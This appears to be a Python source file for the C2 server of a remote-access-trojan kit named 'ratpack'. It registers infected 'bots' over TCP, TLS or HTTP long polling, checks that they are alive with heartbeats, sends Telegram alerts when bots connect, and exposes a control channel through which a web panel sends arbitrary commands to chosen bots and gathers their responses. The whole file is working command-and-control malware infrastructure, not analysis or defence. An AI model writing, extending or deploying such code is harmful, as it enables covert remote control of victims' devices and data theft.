"""
bots.py — bot registry and the C2 data channel.

The C2 is a plain TCP (optionally TLS) server speaking the length-prefixed
protocol in protocol.py. One thread per bot:

  - BotSession  reads frames, answers the handshake, dispatches responses
  - _write_loop drains the bot's outbox

The web panel never touches bot sockets directly: it goes through the
control channel, so the panel can be restarted without dropping the bots.
"""

import json
import os
import queue
import socket
import ssl
import threading
import time
import uuid

from . import protocol as P


def log(fmt, *args):
    import sys
    msg = fmt % args if args else fmt
    sys.stderr.write("[%s] %s\n" % (time.strftime("%H:%M:%S"), msg))
    sys.stderr.flush()


class Bot:
    """
    One connected bot.

    Two transports are supported:

      "tcp"  a raw socket, used when the server owns the port
      "http" a long-polling HTTP session, used when the server sits behind
             a shared-hosting reverse proxy and cannot bind a port of its
             own. The HTTP bot has no socket; the panel talks to it through
             the same command/response protocol.
    """

    def __init__(self, bot_id: str, sock: socket.socket, addr, info: dict,
                 transport: str = "tcp"):
        self.id = bot_id
        self.sock = sock
        self.addr = addr
        self.info = info
        self.transport = transport
        self.outbox = queue.Queue()
        self.alive = True
        self.lock = threading.Lock()
        self.last_seen = time.time()
        self.last_pong = time.time()
        self.pending = {}
        self.cond = threading.Condition()
        self.events = []          # recent events, for the panel
        # Signalled whenever a command is queued, so a long-polling HTTP
        # bot can be woken up instead of waiting for its timeout.
        self.cmd_cv = threading.Condition()
        self.cmd_seq = 0

    def send(self, type_: int, payload: bytes = b""):
        self.outbox.put((type_, payload))
        with self.cmd_cv:
            self.cmd_seq += 1
            self.cmd_cv.notify_all()

    def send_json(self, type_: int, obj: dict):
        self.send(type_, json.dumps(obj, separators=(",", ":")).encode("utf-8"))

    def request(self, cmd: str, timeout: float = 60, **args):
        """Sends a command and waits for the matching response."""
        cmd_id = uuid.uuid4().hex[:12]
        obj = {"id": cmd_id, "cmd": cmd}
        obj.update(args)
        holder = {"done": False}
        with self.cond:
            self.pending[cmd_id] = holder
        self.send_json(P.TYPE_COMMAND, obj)

        deadline = time.time() + timeout
        with self.cond:
            while not holder.get("done"):
                remaining = deadline - time.time()
                if remaining <= 0:
                    self.pending.pop(cmd_id, None)
                    raise TimeoutError(f"command timed out: {cmd}")
                self.cond.wait(min(remaining, 1.0))
            self.pending.pop(cmd_id, None)
        result = holder.get("result", holder)
        if isinstance(result, dict) and result.get("ok") is False and "error" in result:
            raise RuntimeError(result["error"])
        return result

    def deliver_response(self, cmd_id: str, obj: dict):
        with self.cond:
            holder = self.pending.get(cmd_id)
            if holder is not None:
                holder["done"] = True
                holder["result"] = obj
                self.cond.notify_all()
            else:
                self.info.setdefault("last_response", obj)

    def record_event(self, obj: dict):
        with self.lock:
            self.events.append({"t": time.time(), "data": obj})
            if len(self.events) > 200:
                del self.events[:-200]

    def close(self):
        self.alive = False
        with self.cmd_cv:
            self.cmd_seq += 1
            self.cmd_cv.notify_all()
        if self.sock is None:
            return
        try:
            self.sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            self.sock.close()
        except OSError:
            pass


class BotRegistry:
    def __init__(self, telegram=None):
        self.bots = {}
        self.lock = threading.Lock()
        self.events = queue.Queue()
        self.telegram = telegram

    def add(self, bot: Bot):
        with self.lock:
            self.bots[bot.id] = bot
        self.events.put({"type": "bot_online", "bot": bot.info})
        log("bot online: %s (%s)", bot.id, bot.addr)
        tg = self.telegram
        if tg is not None and tg.configured() and tg.enabled:
            try:
                tg.notify_bot_online(bot.id, bot.info)
            except Exception:
                pass

    def remove(self, bot: Bot):
        with self.lock:
            self.bots.pop(bot.id, None)
        self.events.put({"type": "bot_offline", "bot": bot.info})
        log("bot offline: %s", bot.id)
        tg = self.telegram
        if tg is not None and tg.configured() and tg.enabled:
            try:
                tg.notify_bot_offline(bot.id)
            except Exception:
                pass

    def get(self, bot_id: str):
        with self.lock:
            return self.bots.get(bot_id)

    def list(self):
        with self.lock:
            return list(self.bots.values())

    def summary(self):
        now = time.time()
        out = []
        for b in self.list():
            out.append({
                "id": b.id,
                "addr": b.addr,
                "info": b.info,
                "last_seen": b.last_seen,
                "last_pong": b.last_pong,
                "silent_for": round(now - b.last_pong, 1),
                "events": len(b.events),
            })
        return out


class BotSession(threading.Thread):
    """Handles one bot connection."""

    def __init__(self, server, sock, addr):
        super().__init__(daemon=True)
        self.server = server
        self.sock = sock
        self.addr = addr
        self.bot = None

    def run(self):
        try:
            self._handshake()
            self._read_loop()
        except Exception as e:
            log("session error (%s): %s", self.addr, e)
        finally:
            if self.bot:
                self.bot.close()
                self.server.registry.remove(self.bot)

    def _handshake(self):
        frame = P.recv_frame(self.sock)
        if frame is None:
            raise ConnectionError("closed before registration")
        type_, payload = frame
        if type_ != P.TYPE_REGISTER:
            raise ConnectionError(f"expected REGISTER, got 0x{type_:02x}")
        try:
            info = json.loads(payload.decode("utf-8"))
        except Exception:
            raise ConnectionError("bad register payload")

        secret = self.server.secret
        if secret and info.get("secret") != secret:
            log("rejecting bot %s: bad secret", self.addr)
            self.sock.sendall(P.pack(P.TYPE_REGISTER_ACK,
                                     json.dumps({"ok": False, "error": "bad secret"}).encode()))
            raise ConnectionError("bad secret")

        bot_id = info.get("id") or uuid.uuid4().hex[:12]
        info["id"] = bot_id
        self.bot = Bot(bot_id, self.sock, self.addr, info)
        self.server.registry.add(self.bot)

        self.bot.send_json(P.TYPE_REGISTER_ACK, {"ok": True, "id": bot_id, "server": "ratpack"})
        threading.Thread(target=self._write_loop, daemon=True).start()

    def _read_loop(self):
        while True:
            frame = P.recv_frame(self.sock)
            if frame is None:
                return
            type_, payload = frame
            if type_ == P.TYPE_PING:
                self.bot.last_pong = time.time()
                self.bot.send(P.TYPE_PONG, payload)
                continue
            if type_ == P.TYPE_PONG:
                self.bot.last_pong = time.time()
                continue
            if type_ == P.TYPE_RESPONSE:
                try:
                    obj = json.loads(payload.decode("utf-8"))
                except Exception:
                    continue
                self.bot.last_seen = time.time()
                self.bot.deliver_response(obj.get("id", ""), obj)
                self.bot.record_event({"kind": "response", "data": obj})
                self.server.registry.events.put(
                    {"type": "response", "bot": self.bot.id, "data": obj})
                continue
            if type_ == P.TYPE_EVENT:
                try:
                    obj = json.loads(payload.decode("utf-8"))
                except Exception:
                    continue
                self.bot.last_seen = time.time()
                self.bot.last_pong = time.time()
                self.bot.record_event({"kind": "event", "data": obj})
                self.server.registry.events.put(
                    {"type": "event", "bot": self.bot.id, "data": obj})

    def _write_loop(self):
        bot = self.bot
        while bot.alive:
            try:
                type_, payload = bot.outbox.get(timeout=1.0)
            except queue.Empty:
                continue
            try:
                bot.sock.sendall(P.pack(type_, payload))
            except OSError:
                bot.alive = False
                return


class Heartbeat(threading.Thread):
    """Pings the bots and drops the ones that stopped answering."""

    def __init__(self, server, interval=20.0, timeout=60.0):
        super().__init__(daemon=True)
        self.server = server
        self.interval = interval
        self.timeout = timeout

    def run(self):
        while True:
            time.sleep(self.interval)
            now = time.time()
            for bot in self.server.registry.list():
                idle = now - bot.last_pong
                if idle > self.timeout:
                    log("heartbeat: dropping silent bot %s (idle %.0fs)", bot.id, idle)
                    bot.close()
                    self.server.registry.remove(bot)
                    continue
                if bot.transport != "tcp":
                    # An HTTP bot keeps itself alive by polling; it has no
                    # socket to ping.
                    continue
                bot.send(P.TYPE_PING, b"")


class ControlServer(threading.Thread):
    """
    Line-delimited JSON control channel.

      {"op":"list"}                -> {"ok":true,"bots":[...]}
      {"op":"cmd","bot":"id",...}  -> {"ok":true,"result":{...}}
      {"op":"events","timeout":1}  -> {"ok":true,"events":[...]}
      {"op":"config"}              -> {"ok":true,"config":{...}}
    """

    def __init__(self, server, host, port):
        super().__init__(daemon=True)
        self.server = server
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((host, port))
        self.sock.listen(16)

    def run(self):
        log("control channel on %s:%d", self.host, self.port)
        while True:
            try:
                conn, addr = self.sock.accept()
            except OSError:
                return
            threading.Thread(target=self._handle, args=(conn, addr), daemon=True).start()

    def _handle(self, conn, addr):
        buf = b""
        try:
            conn.settimeout(None)
            while True:
                chunk = conn.recv(65536)
                if not chunk:
                    return
                buf += chunk
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    if not line.strip():
                        continue
                    reply = self.server.handle_control(line)
                    conn.sendall(json.dumps(reply, separators=(",", ":")).encode("utf-8") + b"\n")
        except (OSError, ValueError):
            pass
        finally:
            try:
                conn.close()
            except OSError:
                pass


class C2Server:
    """The bot-facing C2 server."""

    def __init__(self, cfg: dict, secret: str):
        self.cfg = cfg
        self.secret = secret
        self.telegram = None
        self.registry = BotRegistry()
        c2 = cfg.get("c2", {})
        # "bind" is where the socket listens; "host" is the address the
        # bots are told to connect to. They differ on a host that runs an
        # emulator: bind 0.0.0.0, advertise 10.0.2.2.
        self.host = c2.get("bind", "0.0.0.0")
        self.port = int(c2.get("port", 8777))
        self.ssl_ctx = None
        if c2.get("protocol") == "tls" and c2.get("cert"):
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(c2["cert"], c2.get("key") or None)
            self.ssl_ctx = ctx

    def make_http_bot(self, bot_id, info):
        """Creates a Bot that speaks HTTP long polling instead of TCP."""
        bot = Bot(bot_id, None, ("http", info.get("host", "?")), info,
                  transport="http")
        return bot

    def start(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((self.host, self.port))
        srv.listen(64)
        log("C2 listening on %s:%d (tls=%s)", self.host, self.port, self.ssl_ctx is not None)
        while True:
            conn, addr = srv.accept()
            if self.ssl_ctx:
                try:
                    conn = self.ssl_ctx.wrap_socket(conn, server_side=True)
                except ssl.SSLError as e:
                    log("tls handshake failed: %s", e)
                    continue
            BotSession(self, conn, addr).start()

    # ---------------- control ops ----------------

    def handle_control(self, raw: bytes):
        try:
            req = json.loads(raw.decode("utf-8"))
        except Exception as e:
            return {"ok": False, "error": f"bad json: {e}"}

        op = req.get("op", "")
        try:
            if op == "list":
                return {"ok": True, "bots": self.registry.summary()}
            if op == "events":
                timeout = float(req.get("timeout", 1.0))
                events = []
                deadline = time.time() + timeout
                while True:
                    remaining = deadline - time.time()
                    if remaining <= 0:
                        break
                    try:
                        events.append(self.registry.events.get(timeout=remaining))
                    except queue.Empty:
                        break
                return {"ok": True, "events": events}
            if op == "bot_events":
                bot = self.registry.get(req.get("bot", ""))
                if bot is None:
                    return {"ok": False, "error": "unknown bot"}
                with bot.lock:
                    return {"ok": True, "events": list(bot.events)}
            if op == "cmd":
                bot = self.registry.get(req.get("bot", ""))
                if bot is None:
                    return {"ok": False, "error": "unknown bot"}
                cmd = req.get("cmd", "")
                args = req.get("args", {}) or {}
                timeout = float(req.get("timeout", 60))
                result = bot.request(cmd, timeout=timeout, **args)
                return {"ok": True, "result": result}
            if op == "ping":
                return {"ok": True, "pong": time.time()}
            return {"ok": False, "error": f"unknown op: {op}"}
        except TimeoutError as e:
            return {"ok": False, "error": str(e)}
        except Exception as e:
            return {"ok": False, "error": f"{type(e).__name__}: {e}"}
